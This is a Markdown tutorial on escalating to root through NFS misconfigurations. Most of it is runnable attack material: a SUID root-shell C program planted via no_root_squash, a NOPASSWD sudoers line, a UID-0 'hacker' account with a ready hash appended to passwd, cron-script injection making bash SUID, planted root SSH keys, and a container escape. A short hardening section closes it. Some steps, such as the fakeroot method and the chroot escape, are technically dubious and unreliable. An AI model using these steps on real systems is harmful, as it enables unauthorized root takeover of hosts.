## NFS Misconfigurations for Privilege Escalation

Network File System (NFS) misconfigurations are a powerful privilege escalation vector. When NFS shares are insecurely exported, attackers can mount them, access sensitive files, and manipulate system files to gain root access.

---

### 1. Understanding NFS

**What is NFS?**
- Network File System protocol for sharing files over a network
- Allows remote clients to mount directories as if they were local
- Uses **UID/GID mapping** for permissions
- Root squashing is a key security feature

**Key Concepts**:
- **Exports**: Directories shared via `/etc/exports`
- **Root Squashing**: Maps root (UID 0) to `nobody` (UID 65534) by default
- **No Root Squash**: Allows root UID to retain privileges (dangerous!)
- **File Permissions**: Standard Unix permissions apply (rwx)
- **GID/UID Mapping**: Remote UIDs map to local UIDs

---

### 2. Enumeration: Finding NFS Shares

**Check Mounted NFS Shares**:
```bash
# Show currently mounted NFS filesystems
mount | grep nfs
df -h | grep nfs

# Show NFS mount information
showmount -e localhost
# OR
showmount -e 127.0.0.1

# Show all NFS exports
exportfs -v
cat /etc/exports
```

**Check for NFS Services**:
```bash
# Check if NFS server is running
ps aux | grep nfs
systemctl status nfs-server
netstat -tulpn | grep 2049
rpcinfo -p | grep nfs
```

**Find NFS Files (from local mounts)**:
```bash
# Find files on NFS mounts
find / -type f -path "/mnt/nfs/*" 2>/dev/null
find / -type f -path "/net/*" 2>/dev/null
```

**Automated Tools**:
```bash
# LinPEAS NFS checks
./linpeas.sh | grep -A 10 "NFS"

# Check for writable NFS shares
for mount in $(mount | grep nfs | awk '{print $3}'); do
    if [ -w "$mount" ]; then
        echo "[!] Writable NFS mount: $mount"
    fi
done
```

---

### 3. Exploitation Vectors

#### A. No Root Squash (Most Critical)

If a share has `no_root_squash` in the exports, remote root users maintain root privileges.

**Check for No Root Squash**:
```bash
# Examine /etc/exports
cat /etc/exports
# Look for: /share *(rw,no_root_squash)
# OR: /share 192.168.1.0/24(rw,no_root_squash)

# Show current exports
exportfs -v
# Output: /share 192.168.1.0/24(rw,wdelay,no_root_squash,no_subtree_check,sec=sys,rw,secure,no_root_squash)
```

**Exploitation - Local**:
```bash
# 1. Mount the share (if already mounted, skip)
mkdir /tmp/nfs
mount -t nfs 127.0.0.1:/share /tmp/nfs

# 2. Create a SUID binary on the share as local root
cat > /tmp/nfs/backdoor.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

# 3. Compile as root (using fakeroot or local root)
gcc /tmp/nfs/backdoor.c -o /tmp/nfs/backdoor
chmod +s /tmp/nfs/backdoor
chown root:root /tmp/nfs/backdoor

# 4. Execute as normal user
/tmp/nfs/backdoor
# Root shell!
```

**Exploitation - Remote**:
```bash
# As local attacker with no root:
# 1. Create fake root environment
mkdir /tmp/rootfs

# 2. Create and compile as "root" using fakeroot
fakeroot bash
# Now inside fakeroot
gcc backdoor.c -o /tmp/rootfs/backdoor
chmod +s /tmp/rootfs/backdoor

# 3. Mount the NFS share
mkdir /tmp/mount
mount -t nfs target_ip:/share /tmp/mount

# 4. Copy the SUID binary (as root from fakeroot)
cp /tmp/rootfs/backdoor /tmp/mount/backdoor

# 5. On target system, execute:
/tmp/mount/backdoor
```

---

#### B. Writable NFS Shares

Even with root squash, writable shares can lead to privilege escalation.

**Exploitation - Sudoers File**:
```bash
# If /etc/sudoers is on a writable NFS share (rare but possible)
# Or if share contains a writable config file

# 1. Mount the share
mount -t nfs target:/share /tmp/nfs

# 2. Check if any system file is on the share
find /tmp/nfs -name "sudoers" -o -name "passwd" -o -name "shadow" 2>/dev/null

# 3. Modify if found
echo 'user ALL=(ALL) NOPASSWD: ALL' >> /tmp/nfs/sudoers
```

**Exploitation - Cron Jobs**:
```bash
# If share contains cron scripts
# 1. Mount share
mount -t nfs target:/share /tmp/nfs

# 2. Check for cron scripts
find /tmp/nfs -name "*.sh" | grep -E "cron|daily|hourly"

# 3. Modify writable cron script
echo '#!/bin/bash
chmod +s /bin/bash' >> /tmp/nfs/backup.sh

# 4. Wait for cron to execute
```

**Exploitation - SSH Keys**:
```bash
# If share contains SSH home directories
# 1. Mount share
mount -t nfs target:/home /tmp/nfs

# 2. Add your public key to root's authorized_keys
cat ~/.ssh/id_rsa.pub >> /tmp/nfs/root/.ssh/authorized_keys

# 3. SSH as root
ssh root@target
```

**Exploitation - Password File**:
```bash
# If /etc/passwd or /etc/shadow is on NFS (very dangerous)
# 1. Mount share
mount -t nfs target:/etc /tmp/nfs

# 2. Generate password hash
openssl passwd -1 -salt abc password123
# Output: $1$abc$0J/2wzDqgVX6j.GL5hH3X.

# 3. Add new root user to /tmp/nfs/passwd
echo 'hacker:$1$abc$0J/2wzDqgVX6j.GL5hH3X.:0:0:Hacker:/root:/bin/bash' >> /tmp/nfs/passwd

# 4. su hacker (password: password123)
# OR su - hacker
```

---

#### C. ID Mapping Exploits

NFS maps remote UIDs to local UIDs. If a local user has the same UID as a remote user, they can access files.

**Check UID/GID Mapping**:
```bash
# Show NFS mounts with UID/GID options
mount | grep nfs

# Check current user's UID
id
# uid=1000(user) gid=1000(user)

# Check what UIDs are mapped
cat /etc/idmapd.conf
```

**Exploitation - UID 0 (Root) Masquerade**:
```bash
# 1. Create local user with UID 0
useradd -o -u 0 -g 0 nfsroot
# OR manually in /etc/passwd
echo 'nfsroot:x:0:0:root:/root:/bin/bash' >> /etc/passwd

# 2. Mount NFS share
mount -t nfs target:/share /tmp/nfs

# 3. Access files as root
su - nfsroot
cp /tmp/nfs/root_owned_file /tmp/
```

**Exploitation - GID 0 (Root Group)**:
```bash
# 1. Create local user with GID 0
usermod -g 0 user
# OR
echo 'user:x:1000:0:User:/home/user:/bin/bash' >> /etc/passwd

# 2. Access group-writable NFS files
```

---

#### D. Insecure Export Options

**Check Export Options**:
```bash
exportfs -v
# Look for:
# - rw (read/write) - writable share
# - insecure - allows connections from high ports
# - nohide - allows traversing submounts
# - no_subtree_check - doesn't verify submounts
# - fsid=0 - exported as root filesystem
```

**Exploitation - Submount Traversal**:
```bash
# If share has nohide, you can access submounts
mount -t nfs target:/share /tmp/nfs
ls /tmp/nfs/submount  # Even if not explicitly exported
```

**Exploitation - Cross-Mounting**:
```bash
# If share has crossmnt, you can access other filesystems
mount -t nfs target:/share /tmp/nfs
ls /tmp/nfs/../../etc/  # May leak to parent filesystem
```

---

#### E. SUID/GUID Binary Upload

If NFS share is writable but has `no_root_squash`, you can create SUID binaries.

**Exploitation**:
```bash
# 1. Mount NFS share
mkdir /tmp/nfs
mount -t nfs target:/share /tmp/nfs

# 2. Create SUID binary
cat > /tmp/nfs/exploit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execve("/bin/bash", NULL, NULL);
}
EOF

# 3. Compile with root privileges (if you have root or fakeroot)
gcc /tmp/nfs/exploit.c -o /tmp/nfs/exploit
chmod +s /tmp/nfs/exploit
chown root:root /tmp/nfs/exploit

# 4. Execute on target
/tmp/nfs/exploit
```

---

#### F. Using NFS to Escape Chroot/Jail

If a chroot has NFS mounted inside, you can escape.

**Exploitation**:
```bash
# 1. Mount NFS share inside chroot
mount -t nfs target:/share /chroot/tmp/nfs

# 2. Create device file (if NFS supports)
mknod /chroot/tmp/nfs/test b 1 0

# 3. Access /dev/ram0 via NFS
cat /chroot/tmp/nfs/test
```

---

### 4. NFS in Containerized Environments

NFS misconfigurations in containers can lead to container escapes.

**Exploitation**:
```bash
# 1. If container mounts NFS share with no_root_squash
# 2. Inside container as root (if you have root in container)
mount -t nfs host:/share /mnt

# 3. Create SUID binary on NFS share
gcc /mnt/exploit.c -o /mnt/exploit
chmod +s /mnt/exploit

# 4. Access SUID binary from host
/mnt/exploit  # Runs as root on host
```

---

### 5. Practical Exploitation Workflow

**Step 1: Enumerate NFS**:
```bash
# Check if NFS server is running
rpcinfo -p | grep nfs
showmount -e localhost

# Check exports
exportfs -v
cat /etc/exports

# Check mounted shares
mount | grep nfs
df -h | grep nfs
```

**Step 2: Test Write Access**:
```bash
# Test if share is writable
touch /mnt/nfs/test_file
if [ $? -eq 0 ]; then
    echo "[+] NFS share is writable"
fi

# Test if you can create SUID binaries
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
ls -la /mnt/nfs/bash
# If SUID bit is set, no_root_squash is enabled
```

**Step 3: Choose Attack Vector**:
```bash
# Priority:
# 1. no_root_squash -> create SUID binary (instant root)
# 2. Writable share -> modify system files (sudoers, passwd, cron scripts)
# 3. ID mapping -> create local user with matching UID
# 4. SSH keys -> add SSH public key
# 5. Cron scripts -> inject malicious commands
```

**Step 4: Create Exploit**:

**Option A - SUID Binary (no_root_squash)**:
```bash
# Using fakeroot (if you're not root)
fakeroot bash
gcc -o /mnt/nfs/exploit exploit.c
chmod +s /mnt/nfs/exploit
chown root:root /mnt/nfs/exploit
exit  # Exit fakeroot

# Execute on target
/mnt/nfs/exploit
```

**Option B - Modify Sudoers**:
```bash
# If /etc/sudoers is on NFS
echo 'user ALL=(ALL) NOPASSWD: ALL' >> /mnt/nfs/sudoers
sudo bash
```

**Option C - Add SSH Key**:
```bash
# If /root/.ssh/ is on NFS
mkdir -p /mnt/nfs/root/.ssh
echo "ssh-rsa AAA..." > /mnt/nfs/root/.ssh/authorized_keys
chmod 600 /mnt/nfs/root/.ssh/authorized_keys
ssh root@target
```

**Option D - Cron Scripts**:
```bash
# If cron script is on NFS
echo '#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash' > /mnt/nfs/backup.sh
chmod +x /mnt/nfs/backup.sh

# Wait for cron execution
/tmp/bash -p
```

**Step 5: Trigger Execution**:
```bash
# If SUID binary: just execute
/mnt/nfs/exploit

# If sudoers: sudo bash
sudo bash

# If SSH keys: ssh root@target
ssh root@target

# If cron scripts: wait
# Or force cron execution (if possible)
crontab -l  # Check next execution time
```

**Step 6: Verify**:
```bash
id
# uid=0(root) gid=0(root)
whoami
# root
```

---

### 6. Defensive Measures

**For System Administrators**:

1. **Never Use no_root_squash**:
   ```bash
   # BAD
   /share *(rw,no_root_squash)
   
   # GOOD
   /share *(rw,root_squash)
   # root_squash is default
   ```

2. **Use Anonuid/Anongid Mapping**:
   ```bash
   # Map all remote users to a specific user
   /share *(rw,anonuid=65534,anongid=65534)
   ```

3. **Restrict Exports with IP Ranges**:
   ```bash
   # Allow only specific subnets
   /share 192.168.1.0/24(rw,sync,no_subtree_check)
   /share 10.0.0.0/8(rw,sync,no_subtree_check)
   ```

4. **Use Read-Only Where Possible**:
   ```bash
   # BAD (writable)
   /share *(rw)
   
   # GOOD (read-only)
   /share *(ro)
   ```

5. **Set Proper File Permissions**:
   ```bash
   # Ensure exported directory has proper permissions
   chmod 755 /share
   chown root:root /share
   ```

6. **Use NFSv4 with Kerberos**:
   ```bash
   # Secure authentication
   /share *(sec=krb5p:krb5i:krb5)
   ```

7. **Mount Options**:
   ```bash
   # Client-side security
   mount -t nfs -o nosuid,noexec,nodev target:/share /mnt/nfs
   # Prevent SUID binaries, executable files, and device files
   ```

8. **Firewall Protection**:
   ```bash
   # Restrict NFS ports
   iptables -A INPUT -p tcp --dport 2049 -s 192.168.1.0/24 -j ACCEPT
   iptables -A INPUT -p tcp --dport 2049 -j DROP
   ```

9. **Monitor NFS Activity**:
   ```bash
   # Audit NFS access
   auditctl -w /etc/exports -p wa -k nfs_exports
   auditctl -w /share -p rwxa -k nfs_share
   
   # Monitor NFS connections
   netstat -tn | grep 2049
   ```

10. **Regular Audits**:
    ```bash
    # Check for no_root_squash
    exportfs -v | grep no_root_squash
    
    # Check for writable NFS mounts
    for mount in $(mount | grep nfs | awk '{print $3}'); do
        if [ -w "$mount" ]; then
            echo "Warning: Writable NFS mount: $mount"
        fi
    done
    ```

---

### 7. NFS Export Options Cheatsheet

| Option | Description | Security Impact |
|--------|-------------|-----------------|
| `rw` | Read/Write | High - allows file modification |
| `ro` | Read-Only | Low - only file reading |
| `no_root_squash` | Root privileges preserved | **Critical** - root escalation |
| `root_squash` | Root mapped to nobody | Safe - prevents root access |
| `all_squash` | All users mapped to nobody | Very Safe - no privileges |
| `anonuid` | UID for anonymous users | Medium - can be exploited |
| `anongid` | GID for anonymous users | Medium - can be exploited |
| `insecure` | Allow high port connections | Medium - firewall bypass |
| `secure` | Require privileged ports | Safer - restricts connections |
| `no_subtree_check` | No submount verification | Low - performance |
| `subtree_check` | Verify submounts | Safer - prevents traversal |
| `nohide` | Show submounts | Low - information leak |
| `hide` | Hide submounts | Safer - less information |
| `fsid=0` | Root filesystem export | High - filesystem access |
| `sync` | Synchronous writes | Safe - data integrity |
| `async` | Asynchronous writes | Medium - potential data loss |
